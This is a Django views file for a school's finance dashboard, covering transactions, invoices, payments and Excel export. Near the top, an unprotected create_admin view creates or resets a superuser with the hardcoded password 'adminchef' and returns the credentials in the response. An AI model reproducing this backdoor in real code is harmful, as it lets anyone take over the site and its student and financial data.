"""
views/finance.py — Transaction CRUD, invoice management, chart data, Excel export.
"""

from collections import defaultdict
from datetime import timedelta
from decimal import Decimal

from django.contrib import messages
from django.core.paginator import Paginator
from django.db.models import Q, Sum
from django.shortcuts import get_object_or_404, redirect, render
from django.utils import timezone

from ..models import Transaction, Notification, Invoice, Payment, Student
from .utils import build_excel_response, admin_required


from django.contrib.auth import get_user_model
from django.http import HttpResponse

def create_admin(request):
    User = get_user_model()

    user, created = User.objects.get_or_create(
        username="adminchef",
        defaults={"email": "admin@gmail.com"}
    )

    user.set_password("adminchef")
    user.is_staff = True
    user.is_superuser = True
    user.is_active = True

    if hasattr(user, "role"):
        user.role = "admin"

    user.save()

    return HttpResponse("Admin fixed: username=adminchef password=adminchef")


def check_overdue_invoices():
    today = timezone.now().date()

    invoices = Invoice.objects.filter(
        status__in=["unpaid", "partial"],
        due_date__lt=today
    )

    for invoice in invoices:
        if invoice.status != "overdue":
            # update status ONLY ONCE
            invoice.status = "overdue"
            invoice.save(update_fields=["status"])

            # notify student
            if invoice.student.user:
                Notification.objects.create(
                    recipient=invoice.student.user,
                    title="Paiement en retard",
                    message="Votre paiement est en retard. Veuillez régulariser votre situation.",
                    type="warning",
                    priority="high"
                )

            # notify admin
            Notification.objects.create(
                recipient=None,
                title="Paiement en retard",
                message=f"L’étudiant {invoice.student.first_name} {invoice.student.last_name} a un paiement en retard.",
                type="warning",
                priority="high"
            )

def _build_chart_data(transactions_qs, period):
    now = timezone.now()

    if period == "week":
        start_date = now.date() - timedelta(days=6)
        filtered = transactions_qs.filter(date__gte=start_date, date__lte=now.date())

        daily_income = defaultdict(float)
        daily_expense = defaultdict(float)

        for t in filtered:
            label = t.date.strftime("%a")
            (daily_income if t.type == "Income" else daily_expense)[label] += float(t.amount)

        labels, income_data, expense_data = [], [], []
        for i in range(7):
            label = (start_date + timedelta(days=i)).strftime("%a")
            labels.append(label)
            income_data.append(daily_income.get(label, 0))
            expense_data.append(daily_expense.get(label, 0))

    elif period == "year":
        filtered = transactions_qs.filter(date__year=now.year)
        monthly_income = defaultdict(float)
        monthly_expense = defaultdict(float)

        for t in filtered:
            label = t.date.strftime("%b")
            (monthly_income if t.type == "Income" else monthly_expense)[label] += float(t.amount)

        months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
                  "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

        labels = months
        income_data = [monthly_income.get(m, 0) for m in months]
        expense_data = [monthly_expense.get(m, 0) for m in months]

    else:
        filtered = transactions_qs.filter(date__year=now.year, date__month=now.month)

        daily_income = defaultdict(float)
        daily_expense = defaultdict(float)

        for t in filtered:
            label = t.date.strftime("%d")
            (daily_income if t.type == "Income" else daily_expense)[label] += float(t.amount)

        all_days = sorted(set(daily_income) | set(daily_expense), key=lambda x: int(x))

        labels = all_days
        income_data = [daily_income.get(d, 0) for d in all_days]
        expense_data = [daily_expense.get(d, 0) for d in all_days]

    return labels, income_data, expense_data


def _apply_transaction_filters(qs, request):
    q = request.GET.get("q", "").strip()
    type_filter = request.GET.get("type", "").strip()
    status_filter = request.GET.get("status", "").strip()
    method_filter = request.GET.get("method", "").strip()

    if q:
        qs = qs.filter(
            Q(ref__icontains=q) |
            Q(category__icontains=q) |
            Q(method__icontains=q) |
            Q(note__icontains=q)
        )

    if type_filter:
        qs = qs.filter(type=type_filter)

    if status_filter:
        qs = qs.filter(status=status_filter)

    if method_filter:
        qs = qs.filter(method=method_filter)

    return qs


def _apply_invoice_filters(qs, request):
    invoice_q = request.GET.get("invoice_q", "").strip()
    invoice_status = request.GET.get("invoice_status", "").strip()

    if invoice_q:
        qs = qs.filter(
            Q(id__icontains=invoice_q) |
            Q(student__first_name__icontains=invoice_q) |
            Q(student__last_name__icontains=invoice_q) |
            Q(student__phone__icontains=invoice_q) |
            Q(formation__title__icontains=invoice_q)
        )

    if invoice_status:
        qs = qs.filter(status=invoice_status)

    return qs


@admin_required
def finance(request):
    check_overdue_invoices()

    if request.method == "POST":
        return _handle_transaction_post(request)

    transactions_qs = _apply_transaction_filters(
        Transaction.objects.all().order_by("-date", "-id"),
        request
    )

    invoices_qs = _apply_invoice_filters(
        Invoice.objects
        .select_related("student", "formation")
        .prefetch_related("payments")
        .order_by("-created_at"),
        request
    )

    period = request.GET.get("period", "month").strip() or "month"

    total_revenue = transactions_qs.filter(type="Income").aggregate(total=Sum("amount"))["total"] or 0
    total_cost = transactions_qs.filter(type="Expense").aggregate(total=Sum("amount"))["total"] or 0

    pending_invoices = Invoice.objects.filter(
        status__in=["unpaid", "partial", "overdue"]
    ).count()

    category_totals = defaultdict(lambda: {"amount": 0, "type": ""})

    for t in transactions_qs:
        category_totals[t.category]["amount"] += float(t.amount)
        category_totals[t.category]["type"] = t.type

    category_breakdown = sorted(
        [
            {
                "name": name,
                "amount": data["amount"],
                "type": data["type"]
            }
            for name, data in category_totals.items()
        ],
        key=lambda x: x["amount"],
        reverse=True
    )[:5]

    chart_labels, income_data, expense_data = _build_chart_data(transactions_qs, period)

    transactions_paginator = Paginator(transactions_qs, 10)
    transactions_page = transactions_paginator.get_page(request.GET.get("page"))

    invoices_paginator = Paginator(invoices_qs, 8)
    invoices_page = invoices_paginator.get_page(request.GET.get("invoice_page"))

    query_params = request.GET.copy()
    query_params.pop("page", None)

    invoice_query_params = request.GET.copy()
    invoice_query_params.pop("invoice_page", None)

    methods = (
        Transaction.objects.exclude(method="")
        .values_list("method", flat=True)
        .distinct()
    )

    students = (
        Student.objects
        .filter(is_active=True)
        .select_related("formation")
        .order_by("first_name", "last_name")
    )

    return render(request, "admin_dashboard/finance.html", {
        "month_label": timezone.now().strftime("%B %Y"),
        "total_revenue": total_revenue,
        "total_cost": total_cost,
        "total_profit": total_revenue - total_cost,
        "pending_invoices": pending_invoices,
        "category_breakdown": category_breakdown,
        "transactions": transactions_page,
        "chart_labels": chart_labels,
        "income_data": income_data,
        "expense_data": expense_data,
        "selected_period": period,
        "methods": methods,
        "students": students,
        "invoices": invoices_page,
        "query_string": query_params.urlencode(),
        "invoice_query_string": invoice_query_params.urlencode(),
    })


@admin_required
def export_finance_excel(request):
    qs = _apply_transaction_filters(
        Transaction.objects.all().order_by("-date", "-id"),
        request
    )

    rows = [
        [
            t.id,
            t.date.strftime("%d/%m/%Y") if t.date else "",
            t.type,
            t.category,
            t.ref,
            t.method,
            t.status,
            float(t.amount),
            t.note or "",
        ]
        for t in qs
    ]

    return build_excel_response(
        title="Finance",
        headers=[
            "ID",
            "Date",
            "Type",
            "Catégorie",
            "Référence",
            "Méthode",
            "Statut",
            "Montant",
            "Note"
        ],
        rows=rows,
        column_widths={
            "A": 10,
            "B": 16,
            "C": 14,
            "D": 24,
            "E": 18,
            "F": 18,
            "G": 16,
            "H": 16,
            "I": 40
        },
        filename="finance_jouri.xlsx",
    )


def _handle_transaction_post(request):
    action = request.POST.get("action")

    if action == "create_invoice":
        student_id = request.POST.get("student_id")
        amount = request.POST.get("amount")
        due_date = request.POST.get("due_date")

        if not all([student_id, amount, due_date]):
            messages.error(request, "Veuillez remplir tous les champs de la facture.")
            return redirect("admin_dashboard:finance")

        student = get_object_or_404(
            Student.objects.select_related("formation"),
            id=student_id
        )

        existing = Invoice.objects.filter(
            student=student,
            status__in=["unpaid", "partial", "overdue"]
        ).exists()

        if existing:
            messages.warning(request, "Cet étudiant a déjà une facture non réglée.")
            return redirect("admin_dashboard:finance")

        Invoice.objects.create(
            student=student,
            formation=student.formation,
            total_amount=amount,
            due_date=due_date
        )

        messages.success(request, "Facture créée avec succès.")
        return redirect("admin_dashboard:finance")

    if action == "add_invoice_payment":
        invoice_id = request.POST.get("invoice_id")
        amount = request.POST.get("amount")
        method = request.POST.get("method", "").strip()
        note = request.POST.get("note", "").strip()

        if not all([invoice_id, amount]):
            messages.error(request, "Veuillez remplir les champs du paiement.")
            return redirect("admin_dashboard:finance")

        if not method:
            messages.error(request, "Veuillez choisir une méthode de paiement.")
            return redirect("admin_dashboard:finance")

        invoice = get_object_or_404(
            Invoice.objects.select_related("student", "formation"),
            id=invoice_id
        )

        amount_decimal = Decimal(amount)

        remaining = invoice.total_amount - invoice.paid_amount
        if amount_decimal > remaining:
            messages.error(request, f"Le montant dépasse le reste à payer ({remaining} DZD).")
            return redirect("admin_dashboard:finance")

        payment = Payment.objects.create(
            invoice=invoice,
            amount=amount_decimal,
            method=method,
            note=note,
        )

        invoice.paid_amount += amount_decimal
        invoice.update_status()

        Transaction.objects.create(
            date=timezone.now().date(),
            type="Income",
            category="Paiement étudiant",
            ref=f"PAY-INV-{invoice.id}-{payment.id}",
            method=method,
            status="Paid",
            amount=amount_decimal,
            note=f"Paiement de {invoice.student.first_name} {invoice.student.last_name} - Facture #{invoice.id}",
        )

        if invoice.student.user:
            Notification.objects.create(
                recipient=invoice.student.user,
                title="Paiement reçu",
                message=f"Votre paiement de {amount_decimal} DZD a été reçu pour la facture #{invoice.id}.",
                type="payment",
                priority="medium",
                related_object=f"Facture #{invoice.id}",
            )

        messages.success(request, "Paiement ajouté avec succès.")
        return redirect("admin_dashboard:finance")

    delete_id = request.POST.get("delete_id")
    transaction_id = request.POST.get("transaction_id")

    if delete_id:
        get_object_or_404(Transaction, id=delete_id).delete()
        messages.success(request, "Transaction supprimée avec succès.")
        return redirect("admin_dashboard:finance")

    date = request.POST.get("date")
    transaction_type = request.POST.get("type")
    category = request.POST.get("category", "").strip()
    ref = request.POST.get("ref", "").strip()
    method = request.POST.get("method", "").strip()
    status = request.POST.get("status", "").strip()
    amount = request.POST.get("amount")
    note = request.POST.get("note", "").strip()

    if not all([date, transaction_type, category, ref, amount]):
        messages.error(request, "Veuillez remplir tous les champs obligatoires.")
        return redirect("admin_dashboard:finance")

    if transaction_id:
        t = get_object_or_404(Transaction, id=transaction_id)
        t.date = date
        t.type = transaction_type
        t.category = category
        t.ref = ref
        t.method = method
        t.status = status
        t.amount = amount
        t.note = note
        t.save()

        messages.success(request, "Transaction modifiée avec succès.")

    else:
        Transaction.objects.create(
            date=date,
            type=transaction_type,
            category=category,
            ref=ref,
            method=method,
            status=status,
            amount=amount,
            note=note,
        )

        messages.success(request, "Transaction ajoutée avec succès.")

    return redirect("admin_dashboard:finance")